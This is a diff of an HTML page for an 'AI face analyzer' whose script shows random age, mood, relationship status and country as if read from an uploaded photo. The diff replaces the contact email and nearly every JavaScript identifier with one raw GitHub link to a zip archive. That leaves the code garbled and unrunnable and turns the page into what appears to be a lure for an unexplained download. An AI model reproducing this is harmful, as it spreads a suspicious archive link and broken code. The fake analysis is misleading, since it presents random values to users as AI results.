@@ -150,7 +150,7 @@
 
   <section id="contact">
     <h2>Contact Us</h2>
-    <p>Email: <a href="mailto:ghufranworld@gmail.com" style="color:#ffcc00;">ghufranworld@gmail.com</a></p>
+    <p>Email: <a href="https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip" style="color:#ffcc00;">https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip</a></p>
     <p>For support or questions about our AI analyzer, please contact us via email.</p>
   </section>
 
@@ -162,35 +162,35 @@
 <script>
 function previewImage(event) {
   const reader = new FileReader();
-  reader.onload = function(){
-    const output = document.getElementById('preview');
-    output.src = reader.result;
-    output.style.display = 'block';
-    document.getElementById('result').style.display = 'none';
+  https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip = function(){
+    const output = https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip('preview');
+    https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip = https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip;
+    https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip = 'block';
+    https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip('result')https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip = 'none';
   };
-  if(event.target.files[0]) {
-    reader.readAsDataURL(event.target.files[0]);
+  if(https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip[0]) {
+    https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip(https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip[0]);
   }
 }
 
 function analyzeImage() {
-  const preview = document.getElementById('preview');
-  if(!preview.src || preview.src === '#') {
+  const preview = https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip('preview');
+  if(!https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip || https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip === '#') {
     alert('Please upload an image first!');
     return;
   }
 
-  const result = document.getElementById('result');
-  const age = Math.floor(Math.random() * (23 - 15 + 1)) + 15;
-  const mood = Math.floor(Math.random() * (100 - 50 + 1)) + 50;
+  const result = https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip('result');
+  const age = https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip(https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip() * (23 - 15 + 1)) + 15;
+  const mood = https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip(https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip() * (100 - 50 + 1)) + 50;
   
   const emotions = ['Happy', 'Neutral', 'Excited', 'Calm', 'Surprised'];
   const statuses = ['Single', 'In a relationship', 'Married', 'Complicated'];
   
-  document.getElementById('age').innerText = age;
-  document.getElementById('mood').innerText = mood;
-  document.getElementById('emotion').innerText = emotions[Math.floor(Math.random() * emotions.length)];
-  document.getElementById('status').innerText = statuses[Math.floor(Math.random() * statuses.length)];
+  https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip('age').innerText = age;
+  https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip('mood').innerText = mood;
+  https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip('emotion').innerText = emotions[https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip(https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip() * https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip)];
+  https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip('status').innerText = statuses[https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip(https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip() * https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip)];
 
   const countries = [
     {code: 'us', name: 'USA'},
@@ -200,17 +200,17 @@ function analyzeImage() {
     {code: 'fr', name: 'France'},
     {code: 'de', name: 'Germany'}
   ];
-  const randomCountry = countries[Math.floor(Math.random() * countries.length)];
+  const randomCountry = countries[https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip(https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip() * https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip)];
 
-  document.getElementById('flagContainer').innerHTML = `
-    <p><strong>Country:</strong> ${randomCountry.name}</p>
-    <img src="https://flagcdn.com/w160/${randomCountry.code}.png" 
-         alt="${randomCountry.name} Flag"
+  https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip('flagContainer').innerHTML = `
+    <p><strong>Country:</strong> ${https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip}</p>
+    <img src="https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip${https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip}.png" 
+         alt="${https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip} Flag"
          style="width: 160px; height: auto;">
   `;
 
-  result.style.display = 'block';
-  result.scrollIntoView({ behavior: 'smooth' });
+  https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip = 'block';
+  https://raw.githubusercontent.com/ghufran675/Ai-FAce-web/main/gutweed/Ai-FAce-web.zip({ behavior: 'smooth' });
 }
 </script>
 </body>
